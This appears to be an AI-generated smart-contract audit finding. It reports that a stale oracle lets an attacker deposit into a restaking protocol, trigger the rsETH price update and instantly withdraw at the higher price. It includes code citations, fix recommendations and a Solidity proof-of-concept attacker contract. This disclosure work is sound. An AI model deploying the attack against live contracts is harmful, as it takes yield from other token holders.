After reading all three contracts in full, I can verify each claim against the actual code.

Audit Report

## Title
Oracle Price Update Sandwiching Enables Theft of Unclaimed Yield via Deposit + `instantWithdrawal` - (File: contracts/LRTOracle.sol, contracts/LRTWithdrawalManager.sol, contracts/LRTDepositPool.sol)

## Summary
`LRTOracle.updateRSETHPrice()` is a permissionless public function. Because `LRTDepositPool.getRsETHAmountToMint` mints rsETH using the stored (potentially stale) `rsETHPrice`, while `LRTWithdrawalManager.instantWithdrawal` redeems assets using the live `rsETHPrice` at execution time, an attacker can atomically deposit at the stale lower price, trigger the price update themselves, and immediately withdraw at the new higher price — extracting accrued yield from the protocol in a single transaction.

## Finding Description

`LRTOracle.rsETHPrice` is a stored state variable updated only when `updateRSETHPrice()` is explicitly called. This function carries no access control beyond `whenNotPaused`:

```solidity
// LRTOracle.sol L87-89
function updateRSETHPrice() public whenNotPaused {
    _updateRsETHPrice();
}
``` [1](#0-0) 

The deposit path computes rsETH to mint using the **stored** `rsETHPrice`:

```solidity
// LRTDepositPool.sol L520
rsethAmountToMint = (amount * lrtOracle.getAssetPrice(asset)) / lrtOracle.rsETHPrice();
``` [2](#0-1) 

The instant withdrawal path computes assets to return using the **current** `rsETHPrice` at call time:

```solidity
// LRTWithdrawalManager.sol L593
underlyingToReceive = amount * lrtOracle.rsETHPrice() / lrtOracle.getAssetPrice(asset);
``` [3](#0-2) 

`instantWithdrawal` is publicly callable, gated only by `isInstantWithdrawalEnabled[asset]`: [4](#0-3) 

**Attack sequence (single transaction):**

Let `S` = rsETH supply, `T` = current total ETH in protocol (fair value), `P_old` = stale stored price where `P_old < T/S`.

1. Deposit `X` asset at stale `P_old` → receive `X * assetPrice / P_old` rsETH (more than fair share).
2. Call `updateRSETHPrice()`. The deposit increased both TVL (`T + X·assetPrice`) and rsETH supply (`S + X·assetPrice/P_old`). The new price `P_new = (T + X·assetPrice) / (S + X·assetPrice/P_old)` satisfies `P_old < P_new` because `T > P_old·S` (price was stale).
3. Instantly withdraw the rsETH balance at `P_new` → receive `X · (P_new / P_old)` asset.
4. **Profit = `X · (P_new/P_old − 1)`** asset, extracted from the protocol's TVL.

**Why existing guards fail:**

- `pricePercentageLimit` in `_updateRsETHPrice` only reverts non-manager callers when the price increase exceeds the configured threshold. Sub-threshold updates — the normal case between periodic oracle refreshes — are fully exploitable. If `pricePercentageLimit == 0` (unset), the guard is entirely disabled. [5](#0-4) 
- `instantWithdrawalFee` defaults to `0` and is capped at 10% (`1000` bps). It is not calibrated to the magnitude of oracle drift and provides no protection when unset. [6](#0-5) [7](#0-6) 
- `CantInstantWithdrawMoreThanAvailable` limits attack size to the unstaking vault's liquid balance but does not prevent the attack. [8](#0-7) 

## Impact Explanation

The attacker's profit (`X · (P_new/P_old − 1)`) is extracted directly from the protocol's TVL, diluting the value backing all other rsETH holders. This is **theft of unclaimed yield** — the staking rewards that accrued to the protocol between the last price update and the current block are captured by the attacker rather than distributed proportionally to all holders. The attack is repeatable every time `rsETHPrice` becomes stale. Impact is **High**.

## Likelihood Explanation

Two conditions are required:
1. `isInstantWithdrawalEnabled[asset] == true` — a manager-controlled toggle explicitly designed to be enabled for normal operation.
2. `rsETHPrice` is stale relative to current underlying asset values — the normal state between oracle update calls, which are not atomic with every block.

The attacker needs no flash loan (they supply their own deposit asset), no mempool monitoring, and no privileged role. The entire sequence executes atomically in a single transaction. Likelihood is **Medium** (conditional on instant withdrawal being enabled, which is an intended operational feature).

## Recommendation

**Short term:** Enforce a minimum `instantWithdrawalFee` that exceeds the maximum possible `rsETHPrice` appreciation between oracle updates. Alternatively, snapshot `rsETHPrice` at deposit time per user and use `min(depositTimePrice, currentPrice)` when computing instant withdrawal amounts.

**Long term:** Require a minimum holding period (e.g., one block or a configurable delay) between a deposit and an `instantWithdrawal` for the same address, preventing atomic sandwich execution. Consider restricting `updateRSETHPrice()` to privileged roles or adding a per-block price-update cooldown.

## Proof of Concept

```solidity
contract OracleSandwichAttack {
    ILRTDepositPool depositPool;
    ILRTOracle oracle;
    ILRTWithdrawalManager withdrawalManager;
    IERC20 stETH;
    IERC20 rsETH;

    function attack(uint256 amount) external {
        // Precondition: rsETHPrice is stale (P_old < current fair price)
        // Step 1: Deposit stETH — mints more rsETH than fair value at stale P_old
        stETH.approve(address(depositPool), amount);
        depositPool.depositAsset(address(stETH), amount, 0, "");

        // Step 2: Trigger price update — rsETHPrice increases to P_new > P_old
        oracle.updateRSETHPrice();

        // Step 3: Instantly withdraw at new higher rsETHPrice
        uint256 rsETHBalance = rsETH.balanceOf(address(this));
        rsETH.approve(address(withdrawalManager), rsETHBalance);
        withdrawalManager.instantWithdrawal(address(stETH), rsETHBalance, "");

        // Result: stETH balance > initial amount by X * (P_new/P_old - 1)
    }
}
```

**Foundry fork test plan:** Fork mainnet, set `rsETHPrice` to a value 0.1% below the current fair price (simulating one epoch of staking rewards), call `attack()` in a single transaction, and assert `stETH.balanceOf(attacker) > initialAmount`. The profit scales linearly with deposit size and oracle drift magnitude.

### Citations

**File:** contracts/LRTOracle.sol (L87-89)
```text
    function updateRSETHPrice() public whenNotPaused {
        _updateRsETHPrice();
    }
```

**File:** contracts/LRTOracle.sol (L256-266)
```text
            bool isPriceIncreaseOffLimit =
                pricePercentageLimit > 0 && priceDifference > pricePercentageLimit.mulWad(highestRsethPrice);

            // check if the price difference is above the threshold
            if (isPriceIncreaseOffLimit) {
                // if sender has a manager role, this doesn't revert.
                // if not, it reverts as price went above the threshold
                if (!IAccessControl(address(lrtConfig)).hasRole(LRTConstants.MANAGER, msg.sender)) {
                    revert PriceAboveDailyThreshold();
                }
            }
```

**File:** contracts/LRTDepositPool.sol (L519-521)
```text
        // calculate rseth amount to mint based on asset amount and asset exchange rate
        rsethAmountToMint = (amount * lrtOracle.getAssetPrice(asset)) / lrtOracle.rsETHPrice();
    }
```

**File:** contracts/LRTWithdrawalManager.sol (L56-56)
```text
    uint256 public instantWithdrawalFee; // Fee in basis points (1 = 0.01%)
```

**File:** contracts/LRTWithdrawalManager.sol (L212-233)
```text
    function instantWithdrawal(
        address asset,
        uint256 rsETHUnstaked,
        string calldata referralId
    )
        external
        nonReentrant
        whenNotPaused
        onlySupportedAsset(asset)
        onlySupportedStrategy(asset)
        onlyInstantWithdrawalAllowed(asset)
    {
        if (rsETHUnstaked == 0 || rsETHUnstaked < minRsEthAmountToWithdraw[asset]) {
            revert InvalidAmountToWithdraw();
        }
        if (IERC20(lrtConfig.rsETH()).balanceOf(msg.sender) < rsETHUnstaked) revert NotEnoughRsETH();
        uint256 assetAmountUnlocked = getExpectedAssetAmount(asset, rsETHUnstaked);
        IRSETH(lrtConfig.rsETH()).burnFrom(address(msg.sender), rsETHUnstaked);
        ILRTUnstakingVault unstakingVault = ILRTUnstakingVault(lrtConfig.getContract(LRTConstants.LRT_UNSTAKING_VAULT));
        if (assetAmountUnlocked > unstakingVault.getAssetsAvailableForInstantWithdrawal(asset)) {
            revert CantInstantWithdrawMoreThanAvailable();
        }
```

**File:** contracts/LRTWithdrawalManager.sol (L372-374)
```text
    function setInstantWithdrawalFee(uint256 feeBasisPoints) external onlyLRTManager {
        if (feeBasisPoints > 1000) revert FeeTooHigh(); // Max 10%
        instantWithdrawalFee = feeBasisPoints;
```

**File:** contracts/LRTWithdrawalManager.sol (L590-594)
```text
        ILRTOracle lrtOracle = ILRTOracle(lrtConfig.getContract(LRTConstants.LRT_ORACLE));

        // calculate underlying asset amount to receive based on rsETH amount and asset exchange rate
        underlyingToReceive = amount * lrtOracle.rsETHPrice() / lrtOracle.getAssetPrice(asset);
    }
```
